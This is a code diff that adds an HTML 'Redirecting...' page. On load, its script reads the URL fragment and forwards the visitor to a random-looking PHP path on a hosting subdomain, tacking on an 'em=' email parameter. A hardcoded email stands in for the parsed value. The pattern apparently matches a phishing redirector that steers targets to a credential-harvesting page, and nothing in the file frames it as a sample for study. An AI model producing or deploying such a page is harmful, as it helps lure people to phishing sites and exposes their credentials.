@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        function redirectWithFragment() {
+            // Get the fragment part of the URL (everything after the '#')
+            const fragment = window.location.hash.substr(1);
+
+            // Check if the fragment contains a parameter and value
+            if (fragment) {
+                const [param, value] = fragment.split('=');
+
+                // If both param and value are present, redirect to the PHP file
+                if (param && value) {
+                    window.location.href = `https://s858340.ha005.t.mydomain.zone/7265_NjM48rx31C/Gisnkg6Jr0/O0sWvIrpxC_uns.php?em=23242@id.com`;
+                } else {
+                    // If the fragment format is incorrect, you can choose to handle it (optional)
+                    console.error("Invalid fragment format. Expected #param=value.");
+                    window.location.href = 'https://s858340.ha005.t.mydomain.zone/7265_NjM48rx31C/Gisnkg6Jr0/O0sWvIrpxC_uns.php';
+                }
+            } else {
+                // If no fragment is present, redirect to a default location
+                window.location.href = 'https://s858340.ha005.t.mydomain.zone/7265_NjM48rx31C/Gisnkg6Jr0/O0sWvIrpxC_uns.php';
+            }
+        }
+    </script>
+</head>
+<body onload="redirectWithFragment()">
+    <!-- Fallback link in case JavaScript is disabled -->
+    <p>If you are not redirected automatically, follow this <a id="redirectLink" href="https://s858340.ha005.t.mydomain.zone/7265_NjM48rx31C/Gisnkg6Jr0/O0sWvIrpxC_uns.php">link</a>.</p>
+</body>
+</html>
